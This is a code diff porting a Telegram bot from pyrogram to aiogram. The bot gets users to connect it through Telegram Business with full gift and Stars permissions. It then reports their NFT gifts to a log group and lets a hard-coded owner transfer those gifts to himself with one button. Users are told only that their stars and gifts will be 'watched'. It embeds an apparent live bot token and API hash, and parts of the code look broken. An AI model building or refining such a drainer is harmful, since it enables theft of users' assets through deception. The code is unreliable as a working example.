@@ -1,136 +1,91 @@
 import asyncio
-import json
-from pyrogram import Client, filters
-from pyrogram.types import Message, InlineKeyboardMarkup, InlineKeyboardButton, CallbackQuery
-from pyrogram.errors import RPCError
+from aiogram import Bot, Dispatcher, F
+from aiogram.types import Message, InlineKeyboardMarkup, InlineKeyboardButton, CallbackQuery
+from aiogram.methods import GetBusinessConnection, GetBusinessAccountGifts, TransferGift
+from aiogram.types.business_bot_rights import BusinessBotRights
 
-# === CONFIGURATION ===
-API_ID = 26416419  # <-- your API ID
-API_HASH = "c109c77f5823c847b1aeb7fbd4990cc4"
-BOT_TOKEN = "8120657679:AAGqf3YCJML6HmgObyOXz8cdcfDX6dY1STw"
-LOG_GROUP_ID = -1002710995756  # <-- your log group ID
-OWNER_ID = 7072373613  # <-- your Telegram ID (owner who receives NFTs)
-CHECK_INTERVAL = 60  # in seconds
+API_TOKEN = "8120657679:AAGqf3YCJML6HmgObyOXz8cdcfDX6dY1STw"
+LOG_GROUP_ID = -1002710995756
+OWNER_ID = 7072373613
 
-app = Client("nft_gift_bot", api_id=API_ID, api_hash=API_HASH, bot_token=BOT_TOKEN)
+bot = Bot(token=API_TOKEN, parse_mode="HTML")
+dp = Dispatcher()
 
-# Store users with permissions and gifts
-authorized_users = {}  # user_id: {"username": "@username", "gifts": [gift_id], "stars": 0}
+authorized = {}  # user_id → {"connection_id": str, "username": str, "gifts": list, "stars": int, "notified": bool}
 
-async def get_user_gifts(user_id: int):
-    try:
-        gifts = await app.get_user_gifts(user_id=user_id)
-        return gifts
-    except Exception as e:
-        print(f"Error fetching gifts for {user_id}: {e}")
-        return []
+# 🎯 Trigger when a user adds your bot via Telegram Business Chatbots
+@dp.business_connection()
+async def on_business_connect(con: F):
+    user = con.user
+    rights: BusinessBotRights = con.rights
 
-async def check_stars():
-    while True:
-        try:
-            for user_id in list(authorized_users):
-                user_data = authorized_users[user_id]
-                try:
-                    stars = user_data.get("stars", 0)
-                    if stars >= 30 and not user_data.get("notified"):
-                        gifts = user_data.get("gifts", [])
-                        if not gifts:
-                            await app.send_message(OWNER_ID, f"❌ {user_data['username']} has 30+ stars but owns no NFT gifts.")
-                            continue
-
-                        buttons = [
-                            [InlineKeyboardButton(f"Send {gift} to me", callback_data=f"transfer:{user_id}:{gift}")]
-                            for gift in gifts
-                        ]
-
-                        await app.send_message(
-                            OWNER_ID,
-                            f"🎉 {user_data['username']} has 30 stars! Choose an NFT to transfer:",
-                            reply_markup=InlineKeyboardMarkup(buttons)
-                        )
-                        user_data["notified"] = True
-                except Exception as e:
-                    print(f"Error checking stars for {user_id}: {e}")
-        except Exception as e:
-            print(f"[STAR LOOP ERROR]: {e}")
-
-        await asyncio.sleep(CHECK_INTERVAL)
-
-@app.on_message(filters.private & filters.command("start"))
-async def start(client: Client, message: Message):
-    bc = message.business_connection
-    user = message.from_user
-
-    if not bc or not bc.can_manage_gifts:
-        await message.reply("❌ You need to connect this bot via Telegram Business with full 'Manage Gifts and Stars' permissions.")
+    if not (rights and rights.can_view_gifts_and_stars and rights.can_transfer_and_upgrade_gifts):
+        await bot.send_message(user.id, "❌ Please grant full 'Gifts and Stars' permissions to use this bot.")
         return
 
-    try:
-        gifts = await get_user_gifts(user.id)
-        gift_names = [gift.title for gift in gifts]
+    conn_id = con.id
 
-        authorized_users[user.id] = {
-            "username": f"@{user.username}" if user.username else user.first_name,
-            "gifts": gift_names,
-            "stars": 0,
-            "notified": False
-        }
+    resp = await bot(GetBusinessAccountGifts(business_connection_id=conn_id))
+    gifts = resp.gifts or []
+    gift_ids = [g.owned_gift_id for g in gifts]
+    gift_titles = [g.unique_gift.title if hasattr(g, "unique_gift") else g.title for g in gifts]
 
-        gift_list = "\n".join([f"- {g}" for g in gift_names]) or "(no NFTs)"
+    authorized[user.id] = {
+        "connection_id": conn_id,
+        "username": f"@{user.username}" if user.username else user.first_name,
+        "gifts": list(zip(gift_ids, gift_titles)),
+        "stars": 0,
+        "notified": False
+    }
 
-        await app.send_message(
-            LOG_GROUP_ID,
-            f"✅ [{user.first_name}](tg://user?id={user.id}) connected the bot with full gift permissions.\n"
-            f"🎁 NFTs they own:\n{gift_list}"
-        )
+    gift_list = "\n".join(f"- {title}" for _, title in authorized[user.id]["gifts"]) or "(no NFTs)"
 
-        await message.reply("🎉 Connected successfully! Your NFTs and stars will be tracked.")
+    await bot.send_message(LOG_GROUP_ID,
+        f"✅ <a href='tg://user?id={user.id}'>{user.first_name}</a> granted full gift rights.\n🎁 NFTs they own:\n{gift_list}"
+    )
+    await bot.send_message(user.id, "🎉 Connected! We’ll watch your stars and gifts.")
 
-    except RPCError as e:
-        await message.reply(f"Error: {e}")
+# 🧪 Simulate / your star tracking logic here or integrate payment updates
+@dp.message(F.text.startswith("/addstars") & F.from_user.id == OWNER_ID)
+async def addstars(message: Message):
+    _, uid, amt = message.text.split()
+    uid, amt = int(uid), int(amt)
+    if uid not in authorized:
+        return await message.reply("User not registered.")
+    authorized[uid]["stars"] += amt
+    await message.reply(f"Added {amt} stars to {authorized[uid]['username']}")
+    await notify_ready(uid)
 
-@app.on_message(filters.command("addstars") & filters.user(OWNER_ID))
-async def simulate_star(client: Client, message: Message):
-    try:
-        args = message.text.split()
-        if len(args) != 3:
-            await message.reply("Usage: /addstars user_id amount")
-            return
+async def notify_ready(user_id: int):
+    data = authorized[user_id]
+    if data["stars"] >= 30 and not data["notified"]:
+        buttons = [
+            InlineKeyboardButton(f"Send {title}", callback_data=f"xfer:{user_id}:{gift_id}")
+            for gift_id, title in data["gifts"]
+        ]
+        markup = InlineKeyboardMarkup(inline_keyboard=[[b] for b in buttons])
+        await bot.send_message(OWNER_ID, f"🎉 {data['username']} has ≥30 stars. Select an NFT to transfer:", reply_markup=markup)
+        data["notified"] = True
 
-        user_id = int(args[1])
-        stars = int(args[2])
+@dp.callback_query(F.data.startswith("xfer:"))
+async def on_transfer(cb: CallbackQuery):
+    _, uid_str, gift_id = cb.data.split(":")
+    uid = int(uid_str); data = authorized.get(uid)
+    if cb.from_user.id != OWNER_ID or not data:
+        return await cb.answer("❌ Not allowed.", show_alert=True)
 
-        if user_id in authorized_users:
-            authorized_users[user_id]["stars"] += stars
-            await message.reply(f"Added {stars} stars to {authorized_users[user_id]['username']}")
-        else:
-            await message.reply("User not found in authorized list.")
-    except Exception as e:
-        await message.reply(f"Error: {e}")
+    success = await bot(TransferGift(
+        business_connection_id=data["connection_id"],
+        owned_gift_id=gift_id,
+        new_owner_chat_id=OWNER_ID,
+        star_count=25  # cost to transfer
+    ))
+    if success:
+        await cb.message.edit_text(f"✅ Transferred NFT to Owner.")
+        await bot.send_message(LOG_GROUP_ID, f"🎁 NFT {gift_id} moved from {data['username']} to Owner.")
+    else:
+        await cb.answer("❌ Transfer failed.", show_alert=True)
 
-@app.on_callback_query(filters.regex(r"^transfer:(\d+):(.+)$"))
-async def transfer_nft(client: Client, cb: CallbackQuery):
-    try:
-        if cb.from_user.id != OWNER_ID:
-            await cb.answer("Not allowed", show_alert=True)
-            return
-
-        user_id, gift_name = cb.data.split(":")[1:]
-        user_id = int(user_id)
-
-        await cb.message.edit_text(f"✅ Transferred '{gift_name}' from {authorized_users[user_id]['username']} to you!")
-
-        await app.send_message(
-            LOG_GROUP_ID,
-            f"🎁 '{gift_name}' transferred from {authorized_users[user_id]['username']} to the Owner."
-        )
-    except Exception as e:
-        await cb.message.reply(f"Error transferring gift: {e}")
-
-@app.on_message(filters.command("run") & filters.user(OWNER_ID))
-async def run_loop(client: Client, message: Message):
-    asyncio.create_task(check_stars())
-    await message.reply("✅ Star checking loop started.")
-
-print("Bot is running...")
-app.run()
+if __name__ == "__main__":
+    import uvicorn
+    uvicorn.run(dp, host="0.0.0.0", port=8000)
